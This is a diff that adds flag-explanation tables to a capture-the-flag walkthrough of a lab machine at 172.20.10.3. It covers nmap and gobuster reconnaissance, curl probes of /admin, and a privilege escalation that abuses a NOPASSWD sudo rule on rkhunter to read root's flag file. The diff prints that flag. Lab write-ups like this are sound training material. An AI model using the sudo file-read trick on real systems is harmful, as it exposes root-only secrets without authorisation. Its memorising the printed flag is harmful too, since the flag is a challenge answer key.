@@ -39,6 +39,12 @@ Target identified: `172.20.10.3`
 nmap -sV -sC -p- 172.20.10.3
 ```
 
+| Flag | Meaning |
+|---|---|
+| `-sV` | Version detection — identifies the service and version on each open port |
+| `-sC` | Runs default NSE scripts — grabs banners, finds robots.txt, checks for common misconfigs |
+| `-p-` | Scans all 65535 ports, not just the default top 1000 |
+
 ```
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)
@@ -61,6 +67,13 @@ gobuster dir -u http://172.20.10.3:8080 \
   --exclude-length 21
 ```
 
+| Flag | Meaning |
+|---|---|
+| `dir` | Directory/file bruteforce mode |
+| `-u` | Target URL |
+| `-w` | Wordlist to use for bruteforcing |
+| `--exclude-length 21` | Ignore responses with body length of 21 bytes (wildcard false positives) |
+
 ```
 /admin    (Status: 200) [Size: 13]
 /beacon   (Status: 204) [Size: 0]
@@ -71,6 +84,11 @@ Checked the `/admin` endpoint with a GET request:
 ```bash
 curl -v -X GET http://172.20.10.3:8080/admin
 ```
+
+| Flag | Meaning |
+|---|---|
+| `-v` | Verbose — shows full request and response headers, not just the body |
+| `-X GET` | Explicitly sets the HTTP method (GET is default, but useful for clarity) |
 
 ```
 < HTTP/1.1 200 OK
@@ -90,6 +108,11 @@ Sent a POST request to `/admin`:
 ```bash
 curl -v -X POST http://172.20.10.3:8080/admin
 ```
+
+| Flag | Meaning |
+|---|---|
+| `-v` | Verbose — shows full request and response headers |
+| `-X POST` | Changes the HTTP method to POST instead of the default GET |
 
 ```
 < HTTP/1.1 200 OK
@@ -168,6 +191,12 @@ This means it can be abused to read arbitrary files as root:
 ```bash
 sudo rkhunter -C --configfile /root/root.txt
 ```
+
+| Flag | Meaning |
+|---|---|
+| `sudo` | Run as root (allowed via NOPASSWD sudoers rule) |
+| `-C` / `--config-check` | Validates a configuration file — prints contents as errors if format is wrong |
+| `--configfile` | Specifies which file to use as config — here we point it at root's flag file |
 
 ```
 grep: bad regex ' HMV{FhOpuXDUlZFhOpuXDUlZ} ': Invalid contents of {}
